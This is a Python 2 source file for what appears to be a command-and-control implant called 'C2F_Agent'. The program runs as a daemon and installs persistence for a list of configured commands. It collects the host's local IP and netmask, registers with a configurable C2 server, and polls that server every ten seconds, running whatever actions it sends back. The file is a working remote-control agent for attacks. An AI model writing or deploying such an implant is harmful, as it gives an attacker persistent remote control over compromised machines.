from os import sys, path
sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))
import actions
import argparse
import json
import socket
import fcntl
import struct
import tempfile
from threading import Thread
from os import sys, path
from .rest import Rester
from .lib.persistance import PersistenceMGMT
from .lib.containers import ContainerMGMT
from .lib.daemon import Daemon
from .db.SQLite import Helper
from .settings import commands

try:
    import psutil
except ImportError as e:
    print "psutil is not installed. Note that GCC is a dependency of psutil. Re-run the Agent installation command to " \
          "attempt installation of psutil and auto-configure the agent"

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--c2-host', action='store', dest='host', help='Change the c2 node hostname')
    parser.add_argument('--c2-port', action='store', dest='port',
                        help='Set port for C2 server')
    parser.add_argument('--ssl', action='store_true', dest='ssl', help='Turn SSL usage on'),
    parser.add_argument('--no-ssl', action='store_false', dest='ssl', help="Turn SSL usage off")
    parser.add_argument('start', nargs="?", default="")
    parser.add_argument('stop', nargs="?", default="")
    parser.add_argument('restart', nargs="?", default="")
    args = parser.parse_args()
    return args


def update_config(db, args):
    if args.host:
        db.set_config('c2_host', args.host)
    if args.port:
        db.set_config('c2_port', args.port)
    if args.ssl is not None:
        db.set_config('ssl', str(args.ssl))


def main(args=None):
    db = Helper()
    args = parse_args()
    update_config(db, args)
    init()
    api_loop()


def init():
    db = Helper()

    def run():
        persistence = PersistenceMGMT()
        for command in commands:
            print "[+] Persisting %s" % command
            persistence.persist(command)

    def get_ip_info():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((db.get_config("c2_host"), int(db.get_config("c2_port"))))
        local_ip = s.getsockname()[0]
        s.close()

        interfaces = psutil.net_if_addrs()
        for interface, values in interfaces.iteritems():
            if local_ip == values[0].address:
                netmask = values[0].netmask
                break
        db.set_config("local_ip", local_ip)
        db.set_config("netmask", netmask)

    run()
    get_ip_info()


def exec_cmd(cmd, cmd_id):
    rest = Rester()
    verbs = actions.verbs
    cmd = json.loads(cmd)
    action = cmd["action"]
    if action in verbs:
        func = verbs[action]
        if action == "run":
            t = Thread(target=func, args=(cmd,))
            t.start()
        else:
            func(cmd)
    rest.commandComplete(cmd_id)


def api_loop():
    from time import sleep
    rest = Rester()
    rest.register()
    while True:
        commands = rest.beacon()
        map(lambda cmd: exec_cmd(cmd['cmd'], cmd['id']), commands)
        sleep(10)


class C2F_Daemon(Daemon):
    def run(self):
        main()


if __name__ == "__main__":
    daemon = C2F_Daemon('%s/C2F_Agent.pid' % tempfile.gettempdir())
    if len(sys.argv) >= 2:
        if 'start' == sys.argv[1]:
            daemon.start()
        elif 'stop' == sys.argv[1]:
            daemon.stop()
        elif 'restart' == sys.argv[1]:
            daemon.restart()
        else:
            print "Unknown command"
            sys.exit(2)
        sys.exit(0)
    else:
        print "usage: %s start|stop|restart" % sys.argv[0]
        sys.exit(2)